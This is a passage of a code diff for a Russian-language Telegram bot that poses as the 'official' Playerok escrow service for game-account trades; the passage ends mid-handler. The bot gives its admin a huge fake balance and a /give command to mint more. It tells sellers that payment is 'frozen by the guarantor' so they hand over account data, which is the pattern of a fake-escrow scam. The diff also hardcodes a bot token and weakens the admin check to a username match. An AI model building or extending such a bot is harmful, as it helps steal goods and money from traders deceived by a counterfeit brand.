@@ -3,18 +3,16 @@ import fs from 'fs';
 import http from 'http';
 
 const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
+const ADMIN_USERNAME = 'k13_way'; 
 const ADMIN_ID = 8886821631; 
 
 let users = {}, deals = {}, states = {};
 
-// Авто-заглушка для прохождения проверки портов Render
 const PORT = process.env.PORT || 10000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
     res.end('Bot is running\n');
-}).listen(PORT, '0.0.0.0', () => {
-    console.log(`🌐 Внутренний порт веб-сервиса запущен на порту ${PORT}`);
-});
+}).listen(PORT, '0.0.0.0');
 
 if (fs.existsSync('database.json')) {
     try { users = JSON.parse(fs.readFileSync('database.json', 'utf8')); } catch(e) { users = {}; }
@@ -25,51 +23,111 @@ function saveDB() {
 }
 
 function init(id, name) {
+    const username = name ? name.toLowerCase() : '';
     if (!users[id]) {
         const startBalance = (id === ADMIN_ID) ? 16699677 : 0;
-        users[id] = { id, username: name ? name.toLowerCase() : 'нет', balance: startBalance, count: 0 };
+        users[id] = { id, username, balance: startBalance, count: 0 };
         saveDB();
-    } else if (name) {
-        users[id].username = name.toLowerCase();
+    } else if (username && users[id].username !== username) {
+        users[id].username = username;
         saveDB();
     }
 }
 
+function findIdByUsername(name) {
+    if (!name) return null;
+    const clean = name.replace('@', '').trim().toLowerCase();
+    for (const id in users) { if (users[id].username === clean) return parseInt(id); }
+    return null;
+}
+
 const menu = Markup.keyboard([
     ['🤝 Создать сделку'],
-    ['💳 Баланс', '🛡 Безопасность'],
+    ['💳 Баланс', '🛡️ Безопасность'],
     ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']
 ]).resize();
 
 bot.start((ctx) => {
     init(ctx.from.id, ctx.from.username);
-    ctx.replyWithMarkdown('Добро пожаловать 👋\n\n✅ *PlayerOk* — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n🥇 Автоматизированный алгоритм исполнения.\n🔎 Скорость и автоматизация.\n💳 Удобный и быстрый вывод средств.\n\n• Комиссия сервиса: 1%\n• Режим работы: 24/7\n• Поддержка: @sw1zyy01\n\n🛡 Выберите нужный раздел ниже:', menu);
+    const text = `Добро пожаловать 👋\n\n` +
+        `✅ *PlayerOk* — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n` +
+        `🥇 Автоматизированный алгоритм исполнения.\n` +
+        `🔎 Скорость и автоматизация.\n` +
+        `💳 Удобный и быстрый вывод средств.\n\n` +
+        `• Комиссия сервиса: 1%\n` +
+        `• Режим работы: 24/7\n` +
+        `• Поддержка: @sw1zyy01\n\n` +
+        `🛡️ Выберите нужный раздел ниже:`;
+    ctx.replyWithMarkdown(text, menu);
 });
 
-bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => ctx.reply('Playerok Гарант бот, это внутренние безопасные сделки в Telegram! Все сделки и данные хранятся в базе данных Playerok. Если безопасные и быстрые сделки - то только на Playerok!'));
-bot.hears('🛡 Безопасность', (ctx) => ctx.reply('Гарант Playerok - это оффициальный Гарант бот. Тут вы можете проводить безопасные сделки прямо в Telegram! Все сделки храняются на базе данных Playerok. Не ведитесь на мошенников, с любовью Playerok Гарант.'));
-bot.hears('🆘 Поддержка', (ctx) => ctx.reply('Поддержка Playerok Гарант ПРЯМО в Telegram! В случай спорных моментов в сделках, обращайте модератору @sw1zyy01 с медийными доказательствами о пробелмы в сделке. С любовью - Playerok Гарант.'));
+bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => {
+    ctx.reply('💎 Playerok Гарант бот — это внутренние безопасные сделки в Telegram! 🛡️ Все сделки и данные надёжно хранятся в официальной базе данных Playerok. Если безопасные и быстрые сделки — то только на Playerok! ✨');
+});
+
+bot.hears('🛡️ Безопасность', (ctx) => {
+    ctx.reply('🛡️ Гарант Playerok — это официальный Гарант бот. Тут вы можете проводить полностью безопасные сделки прямо в Telegram! 📊 Все сделки шифруются и хранятся на базе данных Playerok. Не ведитесь на мошенников! ❌ С любовью, Playerok Гарант. ❤️');
+});
+
+bot.hears('🆘 Поддержка', (ctx) => {
+    ctx.reply('🆘 Поддержка Playerok Гарант ПРЯМО в Telegram!\n\n⚖️ В случае спорных моментов в сделках, обращайтесь к нашему официальному модератору @sw1zyy01. Прикрепите медийные доказательства (скриншоты/видео) проблемы в сделке.\n\nС любовью — Playerok Гарант. ❤️');
+});
 
 bot.hears('💳 Баланс', (ctx) => {
     init(ctx.from.id, ctx.from.username);
     const u = users[ctx.from.id];
-    ctx.reply(`ℹ️ Информация о профиле:\n\n👤 Юзернейм: @${u.username}\n🆔 Ваш ID: ${ctx.from.id}\n🤝 Успешных сделок: ${u.count}\n💰 Ваш баланс: ${u.balance.toLocaleString('ru-RU')} руб.\n\n💡 Передайте ваш ID продавцу/покупателю для проведения сделки.`);
+    const text = `👑 *ЛИЧНЫЙ КАБИНЕТ PLAYEROK* 👑\n` +
+        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n` +
+        `👤 *Пользователь:* @${ctx.from.username || 'не установлен'}\n` +
+        `💎 *Статус:* Проверенный трейдер\n` +
+        `📈 *Успешных сделок:* ${u.count}\n\n` +
+        `💵 *Текущий баланс:* [ ${u.balance.toLocaleString('ru-RU')} руб. ]\n\n` +
+        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
+        `✨ _Проводите безопасные сделки, используя юзернеймы участников!_`;
+    ctx.replyWithMarkdown(text);
 });
 
 bot.command('give', (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return ctx.reply('❌ Нет прав.');
+    if (ctx.from.username?.toLowerCase() !== ADMIN_USERNAME) return ctx.reply('❌ У вас нет прав администратора.');
     const args = ctx.message.text.split(' ');
-    if (args.length !== 3) return ctx.reply('⚠️ /give [ID] [Сумма]');
-    const tId = parseInt(args), am = parseInt(args);
-    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Ошибка данных.');
+    if (args.length !== 3) return ctx.reply('⚠️ Формат: /give [ID_Пользователя] [Сумма]');
+    const tId = parseInt(args[1]), am = parseInt(args[2]);
+    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Неверный ID или сумма.');
     init(tId, null); users[tId].balance += am; saveDB();
-    ctx.reply(`✅ Начислено ${am} руб. пользователю ${tId}`);
-    bot.telegram.sendMessage(tId, `💰 Баланс пополнен на: +${am} руб.`).catch(()=>{});
+    ctx.reply(`✅ Успешно начислено ${am} руб. пользователю с ID ${tId}`);
+    bot.telegram.sendMessage(tId, `💰 Администратор зачислил на ваш баланс: +${am} руб.`).catch(()=>{});
 });
 
 bot.hears('🤝 Создать сделку', (ctx) => {
-    states[ctx.from.id] = { step: 'info' };
-    ctx.replyWithMarkdown('📝 *Введите данные сделки одним сообщением.*\n\nФормат: `[Сумма] [Товар] [ID_Продавца]`\n\n📋 *Пример:* `2500 Аккаунт 8886821631` \n\n⚠️ _Важно: Продавец должен узнать свой ID в кнопке «Баланс» и запустить этого бота перед сделкой!_');
+    ctx.reply('👉 Выберите вашу роль в создаваемой сделке:', 
+        Markup.inlineKeyboard([
+            [Markup.button.callback('🛒 Я хочу Купить', 'role_buy'), Markup.button.callback('💰 Я хочу Продать', 'role_sell')]
+        ])
+    );
+});
+
+bot.action('role_buy', (ctx) => {
+    states[ctx.from.id] = { step: 'info', type: 'buy' };
+    ctx.answerCbQuery();
+    ctx.replyWithMarkdown(
+        `🛒 *ОФОРМЛЕНИЕ ПОКУПКИ ТОВАРА*\n\n` +
+        `📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n` +
+        `\`[Сумма] [Название товара] [Юзернейм Продавца]\`\n\n` +
+        `📋 *Пример:* \`2500 Standoff 2 Account @user_name\`\n\n` +
+        `⚠️ _Важно: Продавец должен запустить бота (нажать /start) хотя бы один раз до начала сделки!_`
+    );
+});
+
+bot.action('role_sell', (ctx) => {
+    states[ctx.from.id] = { step: 'info', type: 'sell' };
+    ctx.answerCbQuery();
+    ctx.replyWithMarkdown(
+        `💰 *ОФОРМЛЕНИЕ ПРОДАЖИ ТОВАРА*\n\n` +
+        `📝 Отправьте данные сделки *одним сообщением* строго по шаблону:\n` +
+        `\`[Сумма] [Название товара] [Юзернейм Покупателя]\`\n\n` +
+        `📋 *Пример:* \`1500 Нож в Standoff 2 @user_name\`\n\n` +
+        `⚠️ _Важно: Покупатель должен запустить бота (нажать /start) хотя бы один раз до начала сделки!_`
+    );
 });
 
 bot.on('text', async (ctx, next) => {
@@ -77,77 +135,88 @@ bot.on('text', async (ctx, next) => {
     const st = states[uid];
     if (!st || st.step !== 'info') return next();
 
+    const type = st.type;
     delete states[uid]; 
 
     const text = ctx.message.text.trim();
-    const match = text.match(/^(\d+)\s+(.+?)\s+(\d+)$/);
+    const match = text.match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);
 
     if (!match) {
-        return ctx.reply('❌ Неверный формат сообщения. Нажмите кнопку «🤝 Создать сделку» и попробуйте заново строго по шаблону: [Сумма] [Товар] [ID_Продавца]');
+        return ctx.reply('❌ Неверный формат сообщения!\n\nНажмите кнопку «🤝 Создать сделку» заново и отправьте данные строго по шаблону: [Сумма] [Товар] [@юзернейм]');
     }
 
-    const am = parseInt(match);
-    const item = match;
-    const sid = parseInt(match);
+    const am = parseInt(match[1]);
+    const item = match[2];
+    const targetUsername = match[3];
 
-    if (am <= 0) return ctx.reply('❌ Сумма должна быть больше 0.');
-    if (uid === sid) return ctx.reply('❌ Нельзя создавать сделку с самим собой.');
+    if (am <= 0) return ctx.reply('❌ Ошибка: Сумма сделки должна быть больше нуля.');
 
-    if (!users[sid]) {
-        return ctx.reply(`❌ Продавец с ID ${sid} не найден в базе бота. Он должен сначала зайти в бота и нажать кнопку «Баланс»!`);
+    const targetId = findIdByUsername(targetUsername);
+    if (!targetId) {
+        return ctx.reply(`❌ Пользователь ${targetUsername} не найден в нашей базе данных. Он должен зайти в этого бота и нажать /start, чтобы активировать профиль!`);
     }
+
+    if (uid === targetId) return ctx.reply('❌ Ошибка: Нельзя проводить безопасную сделку с самим собой.');
 
     const dId = Math.floor(100000 + Math.random() * 900000);
-    deals[dId] = { id: dId, bid: uid, sid, am, item, status: 'wait' };
+    
+    // Определяем роли
+    const buyerId = (type === 'buy') ? uid : targetId;
+    const sellerId = (type === 'buy') ? targetId : uid;
+    const buyerName = (type === 'buy') ? (ctx.from.username || 'Покупатель') : targetUsername.replace('@','');
+    const sellerName = (type === 'buy') ? targetUsername.replace('@','') : (ctx.from.username || 'Продавец');
 
-    ctx.reply(`⏳ Сделка №${dId} оформлена! Ожидаем, пока продавец примет её.`);
+    deals[dId] = { id: dId, buyerId, sellerId, buyerName, sellerName, am, item, status: 'wait' };
 
-    bot.telegram.sendMessage(sid, `🔔 *Новая сделка №${dId}!*\n\n📦 Товар: *${item}*\n💰 Сумма: *${am} руб.*\n👤 Покупатель ID: \`${uid}\`\n\nВы готовы выполнить сделку?`, {
+    ctx.reply(`⏳ Сделка №${dId} успешно оформлена! Ожидаем подтверждения от второй стороны.`);
+
+    const notifyMsg = `🔔 *ВАМ ПРЕДЛОЖЕНА БЕЗОПАСНАЯ СДЕЛКА №${dId}!* 🔔\n` +
+        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n` +
+        `📦 *Товар/Услуга:* ${item}\n` +
+        `💰 *Сумма сделки:* ${am} руб.\n` +
+        `👤 *Второй участник:* @${ctx.from.username || 'Пользователь'}\n\n` +
+        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
+        `Вы готовы принять условия гаранта и выполнить сделку?`;
+
+    bot.telegram.sendMessage(targetId, notifyMsg, {
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Подтвердить Сделку', `ok_${dId}`)]])
     }).catch(() => {
-        ctx.reply('❌ Не удалось отправить уведомление продавцу.');
+        ctx.reply('❌ Ошибка: Не удалось отправить уведомление второму участнику. Возможно, бот заблокирован.');
     });
 });
 
 bot.action(/^ok_(\d+)$/, async (ctx) => {
-    const dId = parseInt(ctx.match), d = deals[dId];
-    if (!d || ctx.from.id !== d.sid || d.status !== 'wait') return ctx.answerCbQuery('❌ Ошибка.');
-    d.status = 'pay'; await ctx.answerCbQuery('✅ Сделка принята!');
-    await ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте оплаты покупателем.`);
-    bot.telegram.sendMessage(d.bid, `🎉 Продавец принял сделку №${dId}!\n\n📦 Товар: ${d.item}\n💰 К оплате: ${d.am} руб.\n\nНажмите кнопку ниже для оплаты товара с баланса:`, {
+    const dId = parseInt(ctx.match[1]), d = deals[dId];
+    if (!d || ctx.from.id !== d.sellerId || d.status !== 'wait') return ctx.answerCbQuery('❌ Ошибка: Сделка недоступна.');
+    d.status = 'pay'; 
+    await ctx.answerCbQuery('✅ Сделка успешно подтверждена!');
+    await ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте, пока покупатель @${d.buyerName} внесёт оплату.`);
+    
+    bot.telegram.sendMessage(d.buyerId, `🎉 Продавец принял сделку №${dId}!\n\n📦 Товар: *${d.item}*\n💰 К оплате: *${d.am} руб.*\n\nНажмите кнопку ниже для перевода средств на баланс гаранта:`, {
+        parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить покупку', `pay_${dId}`)]])
     });
 });
 
 bot.action(/^pay_(\d+)$/, async (ctx) => {
-    const dId = parseInt(ctx.match), d = deals[dId];
-    if (!d || ctx.from.id !== d.bid || d.status !== 'pay') return ctx.answerCbQuery('❌ Ошибка.');
-    init(d.bid, ctx.from.username); const b = users[d.bid];
-    if (b.balance < d.am) return ctx.reply(`❌ Недостаточно средств. Нужно: ${d.am} руб. Ваш баланс: ${b.balance} руб.`);
+    const dId = parseInt(ctx.match[1]), d = deals[dId];
+    if (!d || ctx.from.id !== d.buyerId || d.status !== 'pay') return ctx.answerCbQuery('❌ Ошибка.');
+    init(d.buyerId, ctx.from.username); 
+    const b = users[d.buyerId];
+    
+    if (b.balance < d.am) return ctx.reply(`❌ Ошибка: На вашем балансе недостаточно средств. Нужно: ${d.am} руб. Ваш баланс: ${b.balance} руб.`);
+    
     b.balance -= d.am; d.status = 'send'; saveDB();
-    await ctx.answerCbQuery('✅ Оплачено!'); await ctx.editMessageText(`💰 Сделка №${dId} оплачена! Деньги заморожены. Ожидайте передачу товара.`);
-    bot.telegram.sendMessage(d.sid, `📢 Покупатель оплатил сделку №${dId}! Деньги заморожены.\n\nПередайте данные покупателю в ЛС. После передачи нажмите кнопку:`, {
+    await ctx.answerCbQuery('✅ Успешно оплачено!');
+    await ctx.editMessageText(`💰 Сделка №${dId} успешно оплачена! Средства заморожены на счёте Playerok. Ожидайте получения товара от продавца.`);
+    
+    bot.telegram.sendMessage(d.sellerId, `📢 Покупатель @${d.buyerName} оплатил сделку №${dId}! Средства успешно заморожены гарантом.\n\n👉 Теперь вы можете безопасно передать данные от аккаунта/товар покупателю в ЛС. После передачи нажмите кнопку ниже:`, {
         ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]])
     });
 });
 
 bot.action(/^sent_(\d+)$/, async (ctx) => {
-    const dId = parseInt(ctx.match), d = deals[dId];
-    if (!d || ctx.from.id !== d.sid || d.status !== 'send') return ctx.answerCbQuery('❌ Ошибка.');
-    d.status = 'check'; await ctx.answerCbQuery('✅ Статус обновлен!'); await ctx.editMessageText(`👌 Вы отметили передачу товара по сделке №${dId}. Ожидайте подтверждения.`);
-    bot.telegram.sendMessage(d.bid, `🔔 Продавец передал товар по сделке №${dId}!\n\nПроверьте данные и подтвердите покупку:`, {
-        ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить покупку', `done_${dId}`)]])
-    });
-});
-
-bot.action(/^done_(\d+)$/, async (ctx) => {
-    const dId = parseInt(ctx.match), d = deals[dId];
-    if (!d || ctx.from.id !== d.bid || d.status !== 'check') return ctx.answerCbQuery('❌ Ошибка.');
-    d.status = 'end'; init(d.sid, null);
-    users[d.sid].balance += d.am; users[d.bid].count++; users[d.sid].count++; saveDB();
-    await ctx.answerCbQuery('🎉 Успешно!'); await ctx.editMessageText(`🎉 Сделка №${dId} успешно завершена! Деньги переведены продавцу.`);
-    bot.telegram.sendMessage(d.sid, `💰 Покупатель подтвердил сделку №${dId}! Вам зачислено: +${d.am} руб.`);
-});
-
-bot.launch().then(() => console.log('🚀 Бот PlayerOk успешно запущен без ошибок!')).catch(e => console.error(e));
+    const dId = parseInt(ctx.match[1]), d = deals[dId];
+    if (!d || ctx.from.id !== d.sellerId || d.status !== 'send') return ctx.answerCbQuery('❌ Ошибка.');
+    d.status = 'check'; 
